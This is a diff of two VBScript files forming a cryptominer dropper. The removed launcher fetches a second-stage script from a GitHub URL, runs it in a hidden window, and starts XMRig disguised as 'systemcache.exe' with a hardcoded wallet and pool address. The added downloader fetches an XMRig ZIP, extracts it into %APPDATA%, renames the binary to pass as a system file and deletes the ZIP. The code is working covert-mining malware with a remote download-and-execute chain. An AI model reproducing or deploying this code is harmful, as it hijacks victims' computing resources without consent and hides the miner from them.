@@ -1,191 +1,183 @@
 ' ========================
-' 2_MinerConf.vbs — Main Miner Configuration and Launcher
+' 1_Downloader.vbs — XMRig Miner Downloader and Extractor
+' This script is designed to be downloaded and executed by 2_MinerConf.vbs.
+' Its primary function is to:
+' 1. Download the XMRig ZIP package from a specified URL.
+' 2. Extract the contents of the ZIP to the designated miner folder.
+' 3. Rename the extracted xmrig.exe to systemcache.exe.
+' 4. Log its actions to the shared miner.log file.
 ' ========================
 
-Option Explicit ' Enforce explicit declaration of all variables for better error detection
+Option Explicit ' Enforce explicit declaration of all variables
 
-Dim shell, fso, exePath, arguments, logFile, cpuThreads, pool, wallet, password, gpuOption
-Dim logFolder, downloaderURL
+' --- Global Object Declarations ---
+Dim shell, fso, http, binaryStream
 
-' --- Create necessary objects (Global scope) ---
+' --- Global Variable Declarations ---
+Dim downloadURL, minerFolder, outputPath, logFilePath
+
+' --- Create necessary global objects ---
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
+Set http = CreateObject("MSXML2.XMLHTTP")
+Set binaryStream = CreateObject("ADODB.Stream")
 
-' --- Paths and URLs ---
-' IMPORTANT: Adjust these paths as needed for your setup
-exePath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner\xmrig-6.21.0\systemcache.exe" ' Standard APPDATA path
-logFile = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner\miner.log"
-logFolder = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner"
-downloaderURL = "https://raw.githubusercontent.com/Mrx-coder-1157/mining-scripts/main/1_Downloader.vbs"
+' --- Configuration ---
+' URL to the XMRig ZIP file. Make sure this URL points to the raw ZIP file.
+downloadURL = "https://github.com/Mrx-coder-1157/xmrig-6.21.0/raw/main/xmrig-6.21.0.zip" ' Verify this URL and ZIP content!
 
-' --- Miner Configuration ---
-' Adjust these values to your specific mining pool and wallet
-cpuThreads = 1 ' Number of CPU threads to use (adjust based on your CPU cores)
-wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.worker1" ' Your wallet address and worker name
-pool = "159.203.162.18:3333" ' Your mining pool address and port
-password = "x" ' Pool password (often 'x' or blank)
+' Destination folder where the miner files will be extracted.
+' This should match the expected path in 2_MinerConf.vbs.
+minerFolder = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner\xmrig-6.21.0\"
 
-' --- Script Start Logging ---
-' Create log folder if it doesn't exist
-If Not fso.FolderExists(logFolder) Then
-    fso.CreateFolder logFolder
-    LogToFile "Created miner log folder: " & logFolder
-End If
-LogToFile "⏳ Starting 2_MinerConf.vbs script..."
+' The final name and path of the XMRig executable after renaming.
+outputPath = minerFolder & "systemcache.exe"
 
-' --- Detect GPU ---
-Dim gpuAvailable
-gpuAvailable = DetectGPU()
-If gpuAvailable Then
-    gpuOption = "--opencl --cuda" ' Enable OpenCL and CUDA if a non-Intel GPU is detected
-    LogToFile "✅ Non-Intel GPU detected. GPU mining enabled."
-Else
-    gpuOption = "" ' No GPU options if only Intel or no GPU
-    LogToFile "🚫 No non-Intel GPU detected. GPU mining disabled."
-End If
+' Log file path (must match the one in 2_MinerConf.vbs for consolidated logging).
+logFilePath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner\miner.log"
 
-' --- Download miner if missing ---
-If Not fso.FileExists(exePath) Then
-    LogToFile "📥 Miner executable not found at " & exePath & ". Initiating download..."
-    Download1DownloaderAndExecute() ' Call the sub to download and run 1_Downloader.vbs
+' ===================================
+' Script Main Logic
+' ===================================
 
-    ' Wait for the miner executable to appear (max 60 seconds)
-    Dim i
-    LogToFile "⏱️ Waiting for systemcache.exe to appear after download/extraction (max 60s)..."
-    For i = 1 To 60 ' Wait up to 60 seconds (adjust if downloads are very slow)
-        If fso.FileExists(exePath) Then Exit For
-        WScript.Sleep 1000 ' Wait 1 second
-    Next
+LogToFile "Starting 1_Downloader.vbs execution..."
 
-    If Not fso.FileExists(exePath) Then
-        LogToFile "❌ Miner executable not found after waiting for download/extraction. Exiting."
-        MsgBox "Miner executable (systemcache.exe) not found after attempted download and extraction. Please check miner.log for details.", vbCritical, "Execution Error"
-        WScript.Quit ' Exit the script if miner not found
+' --- 1. Create Miner Folder ---
+' Ensure the destination folder for the miner exists.
+On Error Resume Next ' Temporarily enable OERN for folder creation
+If Not fso.FolderExists(minerFolder) Then
+    fso.CreateFolder minerFolder
+    If Err.Number = 0 Then
+        LogToFile "Created miner installation folder: " & minerFolder
     Else
-        LogToFile "✅ Miner executable found at " & exePath & "."
+        LogToFile "❌ Failed to create miner installation folder: " & minerFolder & ". Error: " & Err.Description
+        MsgBox "Failed to create miner installation folder: " & minerFolder & vbCrLf & Err.Description & vbCrLf & "Check logs for details.", vbCritical, "Folder Creation Error"
+        WScript.Quit ' Exit if folder cannot be created
     End If
-Else
-    LogToFile "✅ Miner executable already exists at " & exePath & "."
-End If
-
-' --- Launch Miner ---
-arguments = "--algo randomx --url " & pool & " --user " & wallet & " --pass " & password & _
-            " --cpu-threads " & cpuThreads & " --log-file """ & logFile & """ --donate-level 1" & _
-            " --no-color --print-time 60 --api-port 0 " & gpuOption
-
-LogToFile "🚀 Attempting to launch miner with arguments: " & arguments
-On Error Resume Next ' Use OERN for the shell.Run in case the exe path is invalid or blocked
-shell.Run """" & exePath & """ " & arguments, 0, False ' 0 = Hidden window, False = Don't wait (run in background)
-If Err.Number <> 0 Then
-    LogToFile "❌ Error launching miner: " & Err.Description & " (Error Code: " & Err.Number & ")"
-    MsgBox "Failed to launch miner executable. Error: " & Err.Description, vbCritical, "Launch Error"
-Else
-    LogToFile "✅ Miner launched successfully."
 End If
 On Error GoTo 0 ' Turn off OERN
 
-' --- Script End Logging ---
-LogToFile "🏁 2_MinerConf.vbs finished execution."
-WScript.Quit ' End the script
+' --- 2. Download ZIP File ---
+LogToFile "📥 Downloading miner package ZIP from: " & downloadURL
+Dim zipFilePath : zipFilePath = minerFolder & "xmrig.zip"
 
-' ===================================
-' Subroutines and Functions
-' ===================================
+On Error Resume Next ' Use OERN to check HTTP status gracefully
+http.Open "GET", downloadURL, False ' Synchronous download
+http.Send
+On Error GoTo 0 ' Turn off OERN
 
-' --- Function: DetectGPU ---
-' Attempts to detect if a dedicated (non-Intel integrated) GPU is present.
-Function DetectGPU()
-    On Error Resume Next ' Handle errors during WMI query
-    Dim objWMI, colItems, objItem
-    Set objWMI = GetObject("winmgmts:\\.\root\CIMV2")
-    If Err.Number <> 0 Then ' Check if GetObject failed
-        LogToFile "❌ WMI Error (DetectGPU): " & Err.Description
-        DetectGPU = False
-        On Error GoTo 0
-        Exit Function
-    End If
+If http.Status = 200 Then
+    ' Save the downloaded binary data to a ZIP file.
+    binaryStream.Type = 1 ' Binary mode
+    binaryStream.Open
+    binaryStream.Write http.ResponseBody
+    binaryStream.SaveToFile zipFilePath, 2 ' 2 = Overwrite if file exists
+    binaryStream.Close
+    LogToFile "✅ Miner package ZIP downloaded to: " & zipFilePath
 
-    Set colItems = objWMI.ExecQuery("Select * from Win32_VideoController")
-    If Err.Number <> 0 Then ' Check if ExecQuery failed
-        LogToFile "❌ WMI Query Error (DetectGPU): " & Err.Description
-        DetectGPU = False
-        On Error GoTo 0
-        Exit Function
-    End If
+    ' --- 3. Extract ZIP Contents ---
+    LogToFile "📦 Initiating extraction of miner ZIP..."
+    Dim objShellApp, objFolder, objFile
+    Set objShellApp = CreateObject("Shell.Application")
+    Set objFolder = objShellApp.NameSpace(minerFolder) ' Destination for extracted files
+    Set objFile = objShellApp.NameSpace(zipFilePath)   ' Source ZIP file
 
-    DetectGPU = False ' Default to no dedicated GPU
-    For Each objItem In colItems
-        ' Exclude common Intel integrated graphics controllers
-        If InStr(LCase(objItem.Name), "intel") = 0 Then
-            ' Found a non-Intel video controller, assume it's a dedicated GPU
-            DetectGPU = True
-            LogToFile "➡️ Detected GPU: " & objItem.Name
-            Exit For
+    If Not objFolder Is Nothing And Not objFile Is Nothing Then
+        On Error Resume Next ' Handle potential errors during CopyHere
+        objFolder.CopyHere objFile.Items ' This extracts contents of the ZIP
+        If Err.Number <> 0 Then
+            LogToFile "❌ Error during ZIP extraction (CopyHere): " & Err.Description
+            MsgBox "Error during ZIP extraction: " & Err.Description & vbCrLf & "Check logs for details.", vbCritical, "Extraction Error"
+            WScript.Quit
         End If
-    Next
-    On Error GoTo 0 ' Turn off OERN
-End Function
+        On Error GoTo 0
 
-' --- Subroutine: LogToFile ---
-' Appends a message with timestamp to the miner.log file.
+        ' --- Robust Waiting for Extraction Completion ---
+        ' This is crucial! Wait until the expected xmrig.exe file appears or times out.
+        Dim maxWaitSeconds, currentWait
+        maxWaitSeconds = 90 ' Max wait 90 seconds (adjust if your ZIP is very large or system slow)
+        currentWait = 0
+        ' IMPORTANT: Verify this path matches the *actual* location of xmrig.exe inside your ZIP!
+        Dim expectedExtractedPath : expectedExtractedPath = minerFolder & "xmrig-6.21.0\xmrig.exe"
+
+        LogToFile "⏱️ Waiting for extracted xmrig.exe to appear at: " & expectedExtractedPath & " (max " & maxWaitSeconds & "s)..."
+        Do While Not fso.FileExists(expectedExtractedPath) And currentWait < maxWaitSeconds
+            WScript.Sleep 1000 ' Wait 1 second
+            currentWait = currentWait + 1
+        Loop
+
+        If Not fso.FileExists(expectedExtractedPath) Then
+            LogToFile "❌ Miner extraction timed out or original xmrig.exe not found at: " & expectedExtractedPath & ". Please check ZIP contents."
+            MsgBox "Miner extraction failed or timed out. Original xmrig.exe not found after extraction. Check miner.log.", vbCritical, "Extraction Error"
+            WScript.Quit
+        Else
+            LogToFile "✅ Miner extracted successfully. Original executable found."
+        End If
+
+        ' --- 4. Move/Rename Executable ---
+        If Not fso.FileExists(outputPath) Then ' Only rename if the target file (systemcache.exe) doesn't exist
+            On Error Resume Next ' Handle error if move/rename fails
+            fso.MoveFile expectedExtractedPath, outputPath
+            If Err.Number <> 0 Then
+                LogToFile "❌ Error renaming xmrig.exe to systemcache.exe: " & Err.Description
+                MsgBox "Error renaming xmrig.exe to systemcache.exe. Check log.", vbCritical, "Rename Error"
+                WScript.Quit
+            Else
+                LogToFile "✅ Renamed xmrig.exe to systemcache.exe at: " & outputPath
+            End If
+            On Error GoTo 0
+        Else
+            LogToFile "❗ systemcache.exe already exists at " & outputPath & ", skipping rename."
+        End If
+
+        ' --- 5. Clean Up: Delete the downloaded ZIP file ---
+        If fso.FileExists(zipFilePath) Then
+            On Error Resume Next ' Handle error if deletion fails
+            fso.DeleteFile zipFilePath, True ' True = force deletion (read-only)
+            If Err.Number = 0 Then
+                LogToFile "🗑️ Deleted downloaded ZIP file: " & zipFilePath
+            Else
+                LogToFile "❌ Could not delete ZIP file: " & zipFilePath & ". Error: " & Err.Description
+            End If
+            On Error GoTo 0
+        End If
+    Else
+        LogToFile "❌ Error: Shell.Application objects (Namespace for folder or file) are nothing."
+        MsgBox "Internal error during ZIP handling. Check miner.log.", vbCritical, "Internal Error"
+        WScript.Quit
+    End If
+
+Else
+    LogToFile "❌ Failed to download miner package ZIP. HTTP Status: " & http.Status & " - " & http.StatusText
+    MsgBox "Failed to download miner package ZIP from GitHub. HTTP Status: " & http.Status & vbCrLf & "Please verify the download URL or your internet connection.", vbCritical, "Download Error"
+End If
+
+' --- Script End ---
+LogToFile "🏁 1_Downloader.vbs finished execution."
+
+' Clean up objects (important for memory management)
+Set shell = Nothing
+Set fso = Nothing
+Set http = Nothing
+Set binaryStream = Nothing
+' This script should not quit itself unless a critical error occurs,
+' allowing 2_MinerConf.vbs to continue after it.
+
+' ===================================
+' Subroutine: LogToFile (Local to 1_Downloader.vbs)
+' ===================================
+' Appends a message with timestamp to the shared miner.log file.
 Sub LogToFile(msg)
     On Error Resume Next ' Prevent script crash if logging fails
     Dim file
     ' Use '8' for ForAppending mode, 'True' to create the file if it doesn't exist
-    Set file = fso.OpenTextFile(logFile, 8, True)
+    Set file = fso.OpenTextFile(logFilePath, 8, True)
     If Err.Number = 0 Then
-        file.WriteLine Now & " - [2_MinerConf] - " & msg
+        file.WriteLine Now & " - [1_Downloader] - " & msg
         file.Close
     Else
-        ' Fallback: If logging to file fails, try to show a MsgBox (only for critical failures)
-        ' This prevents infinite loops if MsgBox itself causes an error.
-        ' MsgBox "FATAL: Could not write to log file! Error: " & Err.Description & vbCrLf & "Message: " & msg, vbCritical, "Logging Error"
+        ' Fallback if logging fails (e.g., permissions issue on log file)
+        ' MsgBox "FATAL: Downloader could not write to log file! Error: " & Err.Description & vbCrLf & "Message: " & msg, vbCritical, "Logging Error"
     End If
-    On Error GoTo 0
-End Sub
-
-' --- Subroutine: Download1DownloaderAndExecute ---
-' Downloads 1_Downloader.vbs and then executes it.
-Sub Download1DownloaderAndExecute()
-    On Error Resume Next ' Handle errors during download process
-
-    Dim http, binaryStream, tmpPath
-    Set http = CreateObject("MSXML2.XMLHTTP")
-    Set binaryStream = CreateObject("ADODB.Stream")
-
-    ' Define path for the downloaded downloader script
-    tmpPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\1_Downloader.vbs"
-
-    LogToFile "Starting download of 1_Downloader.vbs from: " & downloaderURL
-
-    http.Open "GET", downloaderURL, False ' Synchronous request
-    http.Send
-
-    If http.Status = 200 Then
-        binaryStream.Type = 1 ' Binary mode
-        binaryStream.Open
-        binaryStream.Write http.ResponseBody
-        binaryStream.SaveToFile tmpPath, 2 ' 2 = Overwrite if exists
-        binaryStream.Close
-        LogToFile "✅ 1_Downloader.vbs downloaded successfully to: " & tmpPath
-
-        ' *** IMPORTANT: RUN THE DOWNLOADED SCRIPT TO GET THE MINER ***
-        LogToFile "🚀 Executing 1_Downloader.vbs..."
-        shell.Run "wscript.exe """ & tmpPath & """", 0, True ' 0 = Hidden, True = Wait for it to finish
-        If Err.Number <> 0 Then
-            LogToFile "❌ Error executing 1_Downloader.vbs: " & Err.Description & " (Error Code: " & Err.Number & ")"
-            MsgBox "Failed to execute 1_Downloader.vbs. Error: " & Err.Description, vbCritical, "Execution Error"
-        Else
-            LogToFile "✅ 1_Downloader.vbs finished execution."
-        End If
-
-    Else
-        LogToFile "❌ Failed to download 1_Downloader.vbs. HTTP Status: " & http.Status & " - " & http.StatusText
-        MsgBox "Failed to download 1_Downloader.vbs from GitHub. HTTP Status: " & http.Status & vbCrLf & "Please check your internet connection or the GitHub URL.", vbCritical, "Download Error"
-    End If
-
-    ' Clean up objects
-    Set http = Nothing
-    Set binaryStream = Nothing
     On Error GoTo 0
 End Sub
